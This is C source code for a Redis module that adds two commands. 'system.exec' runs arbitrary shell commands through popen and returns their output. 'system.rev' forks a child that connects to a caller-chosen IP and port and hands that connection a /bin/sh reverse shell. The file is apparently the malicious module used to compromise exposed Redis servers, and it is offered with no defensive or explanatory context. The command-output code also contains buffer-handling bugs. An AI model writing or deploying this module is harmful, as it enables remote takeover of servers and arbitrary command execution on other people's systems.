#include "redismodule.h"

#include <stdio.h> 
#include <unistd.h>  
#include <stdlib.h> 
#include <errno.h>   
#include <sys/wait.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>

int DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
        if (argc == 2) {
                size_t cmd_len;
                size_t size = 1024;
                char *cmd = RedisModule_StringPtrLen(argv[1], &cmd_len);

                FILE *fp = popen(cmd, "r");
                char *buf, *output;
                buf = (char *)malloc(size);
                output = (char *)malloc(size);
                while ( fgets(buf, sizeof(buf), fp) != 0 ) {
                        if (strlen(buf) + strlen(output) >= size) {
                                output = realloc(output, size<<2);
                                size <<= 1;
                        }
                        strcat(output, buf);
                }
                RedisModuleString *ret = RedisModule_CreateString(ctx, output, strlen(output));
                RedisModule_ReplyWithString(ctx, ret);
                pclose(fp);
        } else {
                return RedisModule_WrongArity(ctx);
        }
        return REDISMODULE_OK;
}

int RevShellCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
	if (argc == 3) {
		size_t cmd_len;
		char *ip = RedisModule_StringPtrLen(argv[1], &cmd_len);
		char *port_s = RedisModule_StringPtrLen(argv[2], &cmd_len);
		int port = atoi(port_s);
		int s;
                int pid;
                pid = fork();
                if (pid == 0) {
                  // I am the child
                  struct sockaddr_in sa;
                  sa.sin_family = AF_INET;
                  sa.sin_addr.s_addr = inet_addr(ip);
                  sa.sin_port = htons(port);

                  int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                  if (sock == -1) {
                    perror("Socket creation failed.\n");
                    exit(EXIT_FAILURE);
                  }
                  // Connect socket
                  if (connect(sock, (struct sockaddr *)&sa, sizeof(sa)) == -1) {
                    perror("Socket connection failed.\n");
                    close(sock);
                    exit(EXIT_FAILURE);
                  }

                  dup2(sock, 0);
                  dup2(sock, 1);
                  dup2(sock, 2);
                  
                  execve("/bin/sh", NULL, NULL);
                }
                
        } else {
                return RedisModule_WrongArity(ctx);
        }
    return REDISMODULE_OK;
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx,"system",1,REDISMODULE_APIVER_1)
                        == REDISMODULE_ERR) return REDISMODULE_ERR;

    if (RedisModule_CreateCommand(ctx, "system.exec",
        DoCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
	  if (RedisModule_CreateCommand(ctx, "system.rev",
        RevShellCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
    return REDISMODULE_OK;
}
